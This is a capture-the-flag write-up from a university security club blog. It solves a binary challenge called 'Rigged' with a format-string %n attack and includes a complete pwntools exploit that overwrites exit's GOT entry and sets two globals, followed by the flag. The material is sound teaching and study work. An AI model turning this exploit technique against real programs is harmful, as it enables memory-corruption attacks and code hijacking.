@@ -1,0 +1,91 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Rigged</title><meta content=Rigged name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/rigged/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=Rigged property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/rigged/ property=twitter:url><meta content=Rigged property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/rigged/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>rigged</span></div><time datetime=2024-07-02>Published on: <span class=accent-data>2024-07-02</span></time><address rel=author>By <span class=accent-data> Abhinav I S, and exploiitm </span></address><h1>Rigged</h1><p>first we run, checksec<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>checksec --file</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>challenge
+</span></code></pre><br><div class=textCenter><img alt="Alt Text" src=image1.png></div><p>Looking at it in a decompiler (Ghidra)<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
+</span><span>undefined8 </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
+</span><span>
+</span><span>{
+</span><span> </span><span style=color:#fa5c4b>long</span><span> in_FS_OFFSET;
+</span><span> </span><span style=color:#fa5c4b>char</span><span> local_78 [</span><span style=color:#d3869b>104</span><span>];
+</span><span> </span><span style=color:#fa5c4b>long</span><span> local_10;
+</span><span> 
+</span><span> local_10 </span><span style=color:#fe8019>= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>);
+</span><span> </span><span style=color:#fdf4c1>banner()</span><span>;
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>      </span><span style=color:#b8bb26>"\nHelp Jim to fill these blanks up correctly please and submit your final sentence as the a nswer."
+</span><span style=color:#fdf4c1>      )</span><span>;
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"\nNo matter what answer he provides, it somehow always seems to be wrong."</span><span style=color:#fdf4c1>)</span><span>;
+</span><span> </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>     </span><span style=color:#b8bb26>"\nHe\'ll fail the test if he keeps getting this wrong! The evil school must have rigged the s ystem"
+</span><span style=color:#fdf4c1>     )</span><span>;
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>      </span><span style=color:#b8bb26>"\nQ. In order to write efficient \'____\', developers usually go to a \'____\' to drink some  coffee: "
+</span><span style=color:#fdf4c1>      )</span><span>;
+</span><span> </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
+</span><span> </span><span style=color:#fabd2f>fgets</span><span style=color:#fdf4c1>(local_78,</span><span style=color:#d3869b>100</span><span style=color:#fdf4c1>,stdin)</span><span>;
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Your final answer was "</span><span style=color:#fdf4c1>)</span><span>;
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(local_78)</span><span>;
+</span><span> </span><span style=color:#fa5c4b>if </span><span>((blank1</span><span style=color:#d3869b>.1 </span><span style=color:#fe8019>== </span><span style=color:#d3869b>0xc0de</span><span>) </span><span style=color:#fe8019>&& </span><span>(blank2</span><span style=color:#d3869b>.0 </span><span style=color:#fe8019>== </span><span style=color:#d3869b>0xcafe</span><span>)) {
+</span><span>   </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>        </span><span style=color:#b8bb26>"\nOh! So you were able to somehow pass by the bearest of margins..Not bad. But its still  not good enough for me to care"
+</span><span style=color:#fdf4c1>        )</span><span>;
+</span><span>                 </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>   </span><span style=color:#fabd2f>exit</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
+</span><span> }
+</span><span> </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(
+</span><span style=color:#fdf4c1>      </span><span style=color:#b8bb26>"\nYou failed again! Work Harder for the next test unless you wanna be a failure for the res t of your life"
+</span><span style=color:#fdf4c1>      )</span><span>;
+</span><span> </span><span style=color:#fa5c4b>if </span><span>(local_10 </span><span style=color:#fe8019>!= *</span><span>(</span><span style=color:#fa5c4b>long </span><span style=color:#fe8019>*</span><span>)(in_FS_OFFSET </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>0x28</span><span>)) {
+</span><span>                 </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
+</span><span>   </span><span style=color:#fdf4c1>__stack_chk_fail()</span><span>;
+</span><span> }
+</span><span> </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
+</span><span>}
+</span></code></pre><p>We have to write 0xc0de in blank1.1, 0xcafe in blank2.0, and overwrite the GOT entry for exit to the function aced<p>we will use the printf %n format specifier vulnerability<ol><li>first, we figure out which is the offset where the input we give is stored, using the payload ABCD.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx…</ol><br><div class=textCenter><img alt="Alt Text" src=image2.png></div><p>clearly, 8th argument is the input we give (hex 414243)<ol start=2><li>Address of win function is at 0x401247</ol><blockquote><p>all addresses remain same since PIE is off, we can get these from Ghidra or any decompiler</blockquote><ol start=3><li><p>got address of EXIT is 0x404038</p><li><p>First we write 0x40 at got address of exit + 2 bytes 0x40 of the 0x401247, then we write 0x1247 (4679) but we have already printed 64 bytes, hence our payload will have 4615 extra bytes to print</p><li><p>Address of blank1.1 is 0x404050</p><li><p>Address of blank2 is 0x404054</p><li><p>we have to write 0xc0de (49374) at 0x404050, since we have printed 4679 bytes already, we need to print 49374 - 4679 = 44695 more bytes</p><li><p>Similarly we need to print 2592 more bytes and write it in the address of blank2 (cafe)</p></ol><p>Now we can craft our payload<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/usr/bin/env python3
+</span><span>
+</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span>exe </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./challenge"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>context.binary </span><span style=color:#fe8019>= </span><span>exe
+</span><span>context.log_level </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"debug"
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>conn</span><span>():
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>LOCAL</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process([exe.path])
+</span><span>        </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>DEBUG</span><span>:
+</span><span>            </span><span style=color:#fdf4c1>gdb.attach(r)
+</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
+</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"rvcechalls.xyz"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>32855</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>r
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
+</span><span>    r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>conn()
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#928374>#input is at %8$x
+</span><span>    </span><span style=font-style:italic;color:#928374># blank1 addr = 0x00404050 == 0xc0de
+</span><span>    </span><span style=font-style:italic;color:#928374># blank2 addr = 0x00404054 == 0xcafe
+</span><span>
+</span><span>    gotEx </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x0404038 </span><span style=font-style:italic;color:#928374>#got address of exit
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>r.recv()
+</span><span>    </span><span style=font-style:italic;color:#928374># got address of EXIT is 0x404038
+</span><span>    </span><span style=font-style:italic;color:#928374># win address is 00401247
+</span><span>    </span><span style=font-style:italic;color:#928374># i have to write 0x40 at win+2 bytes
+</span><span>    </span><span style=font-style:italic;color:#928374># i have to write 0x4038 at win
+</span><span>
+</span><span>    payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>""
+</span><span>    </span><span style=font-style:italic;color:#928374># total bytes in stack  = 9 + 12 + 12 + 11 = 44 : padding = 4A first one is 8th , so we have to start at 14
+</span><span>    payload </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%64X</span><span style=color:#b8bb26>%14$n" </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%4615X</span><span style=color:#b8bb26>%15$hn" </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%44695X</span><span style=color:#b8bb26>%16$n" </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%2592X</span><span style=color:#b8bb26>%17$nAAAA" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(gotEx</span><span style=color:#fe8019>+</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(gotEx) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x00404050</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(</span><span style=color:#d3869b>0x404054</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload)
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(exe.got[</span><span style=color:#b8bb26>'exit'</span><span style=color:#fdf4c1>]))
+</span><span>    </span><span style=color:#fdf4c1>r.recv()
+</span><span>    </span><span style=color:#fdf4c1>r.interactive()
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>main()
+</span><span>
+</span></code></pre><br><p>gives us the flag<pre style=background:#282828;color:#fdf4c1aa><code><span>flag{W00Ww_J1M_Y0uVe_GOT_s0m3_c00l_sk1lzzz_1907f147578}
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
